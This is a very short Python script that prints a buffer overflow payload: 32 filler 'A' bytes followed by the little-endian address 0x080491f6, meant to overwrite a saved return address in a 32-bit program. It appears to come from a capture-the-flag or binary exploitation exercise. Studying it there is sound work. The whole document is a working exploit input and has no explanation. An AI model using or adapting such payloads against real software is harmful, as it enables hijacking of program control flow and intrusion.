#!../../../venv/bin/python

import sys

# 080491f6 080491f6
sys.stdout.buffer.write(b"A"*32 + b"\xf6\x91\x04\x08")
